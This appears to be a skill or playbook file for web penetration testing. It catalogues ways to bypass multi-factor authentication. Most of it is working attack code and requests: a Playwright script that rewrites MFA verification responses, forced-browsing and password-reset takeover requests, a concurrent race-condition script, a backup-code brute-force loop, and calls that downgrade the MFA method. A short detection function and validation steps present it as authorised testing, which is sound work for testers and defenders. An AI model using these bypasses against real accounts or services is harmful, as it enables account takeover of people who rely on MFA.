---
name: mfa_2fa_bypass
description: MFA/2FA bypass techniques - response manipulation, direct endpoint access, code reuse, race conditions, SIM swap, backup code brute force
---

# MFA / 2FA Bypass

Multi-factor authentication failures are critical because they enable full account takeover when combined with any credential-based attack. Most MFA bypasses exploit implementation shortcuts rather than cryptographic weaknesses.

## Bypass Category Overview

| Bypass | Root Cause |
|--------|-----------|
| Response manipulation | Server trusts client-supplied validation result |
| Direct endpoint access | No MFA check on the actual feature endpoints |
| Code replay | Single-use codes accepted multiple times |
| Race condition | Window between code validation and session creation |
| Forced browsing | Directly navigating past the MFA challenge |
| Backup code brute force | No rate limit on backup code entry |
| Account recovery bypass | Reset flow skips MFA requirement |
| SIM swap / social eng | SS7 / carrier-level, out of scope for web testing |
| TOTP → email downgrade | User can choose weaker 2FA method during flow |
| Logout race | Between MFA pass and session establishment |

## Bypass 1: Response Manipulation

When the MFA endpoint returns `{"success": false, "mfa_required": true}` on wrong code, try:

```
# Intercept MFA validation response and modify it
Response: {"success": false, "mfa_required": true}
→ Change to: {"success": true, "mfa_required": false}

# Or change HTTP status code:
Response: 401 {"error": "invalid_code"}
→ Change to: 200 {"token": "...wait for app to proceed..."}
```

With browser automation (Playwright + interception):

```python
async def bypass_mfa_response(page, target_url):
    """Intercept MFA response and manipulate it"""
    async def handle_route(route):
        response = await route.fetch()
        body = await response.json()
        
        # Flip success fields
        if 'success' in body:
            body['success'] = True
        if 'mfa_required' in body:
            body['mfa_required'] = False
        if 'verified' in body:
            body['verified'] = True
            
        await route.fulfill(
            status=200,
            content_type='application/json',
            body=json.dumps(body)
        )
    
    await page.route('**/api/mfa/verify**', handle_route)
    await page.goto(target_url)
```

## Bypass 2: Skip MFA Endpoint (Forced Browsing)

```
# After entering username/password, before MFA page:
# 1. Get session cookie from step 1
# 2. Directly access the protected resource without visiting MFA page

GET /dashboard HTTP/1.1
Cookie: session=STEP1_SESSION_COOKIE
# If server doesn't check mfa_verified flag: access granted
```

```python
import requests

# Step 1: Login
s = requests.Session()
r = s.post('https://example.com/login', 
           data={'username': 'victim', 'password': 'password123'})
# At this point session exists but MFA not done

# Step 2: Skip MFA, go to protected page
r2 = s.get('https://example.com/dashboard')
if '2fa' not in r2.url and r2.status_code == 200:
    print("BYPASS CONFIRMED: Accessed dashboard without MFA")
```

## Bypass 3: Code Replay (No Single-Use Enforcement)

```
# Use correct TOTP code once:
POST /mfa/verify
code=123456  → 200 OK, session established

# Immediately try the same code again (within the same 30-second window)
POST /mfa/verify
code=123456  → Should return 400 "Code already used"
             If returns 200 → replay vulnerability
```

## Bypass 4: Race Condition

```python
import asyncio, aiohttp

async def submit_code(session, url, code):
    async with session.post(url, data={'code': code}) as r:
        return r.status, await r.text()

async def race_mfa(url, wrong_codes, correct_code):
    """Send the correct code alongside many wrong ones simultaneously"""
    async with aiohttp.ClientSession(headers={'Cookie': 'session=SESS'}) as s:
        tasks = [submit_code(s, url, c) for c in wrong_codes + [correct_code]]
        results = await asyncio.gather(*tasks)
        for status, body in results:
            if status == 200:
                print(f"WIN: {body[:200]}")

# Use when: code rate-limited per-request but session fixation between validation and auth
asyncio.run(race_mfa('/mfa/verify', ['000000','111111'], '654321'))
```

## Bypass 5: Backup Code Brute Force

```
# Backup codes are often 8-digit decimal = 100,000,000 possibilities
# But many apps use 4-6 digit codes or alphanumeric 6-char = brute-forceable without rate limit

POST /mfa/backup-code HTTP/1.1
Cookie: session=VICTIM_SESSION
code=12345678

# Automate with:
import itertools
for i in range(0, 9999):
    code = f"{i:04d}"  # try 0000-9999 if 4-digit
    # send, check response
```

## Bypass 6: Password Reset Skips MFA

```
# Reset victim's password → new password requires only old password + OTP during initial login
# BUT: password reset confirmation flow may not require MFA
POST /reset-password/confirm
token=VALID_RESET_TOKEN&new_password=attacker_controlled
# → Authenticated session without MFA
```

## Bypass 7: TOTP → Weaker Method Downgrade

```
# During "setup MFA" flow or "manage MFA" page:
# 1. Remove TOTP authenticator via API
# 2. Set SMS/email as only factor (weaker, SIM-swappable)
# Or: check if GET /mfa/setup accepts type=sms without current MFA verification
DELETE /api/mfa/totp
→ 200 OK                    # TOTP removed without re-auth
POST /api/mfa/email/setup
→ 200 OK                    # Email 2FA added (weaker)
```

## Detection Flow

```python
import requests

def test_mfa_skip(base_url, credentials):
    s = requests.Session()
    
    # Step 1: Authenticate
    r = s.post(f'{base_url}/login', data=credentials, allow_redirects=False)
    
    if r.status_code in (302, 200):
        # Step 2: Try to access protected page without MFA
        r2 = s.get(f'{base_url}/account/profile', allow_redirects=False)
        
        if r2.status_code == 200 and 'two-factor' not in r2.text.lower():
            return "VULNERABLE: MFA can be skipped"
        elif r2.status_code in (302, 401):
            redirect_url = r2.headers.get('Location', '')
            if 'mfa' in redirect_url or '2fa' in redirect_url:
                return "PROTECTED: Redirect to MFA on protected page access"
    
    return "INDETERMINATE"
```

## Validation Approach

1. Map the complete auth flow via proxy — identify MFA challenge endpoint and session state
2. Test each bypass in order: response manip → skip → replay → race
3. For response manipulation: confirm by accessing protected endpoint with the manipulated session
4. Record: cookies used, request sequence, proxy request IDs for each step
5. Provide evidence: screenshot or proxy log showing access to protected resource without valid MFA code

## Tools

- Burp Suite Repeater — response manipulation, replay testing
- `ffuf` / Python — backup code brute force
- `asyncio` / `turbo-intruder` — race condition attacks
- Playwright — automated browser interaction + response interception
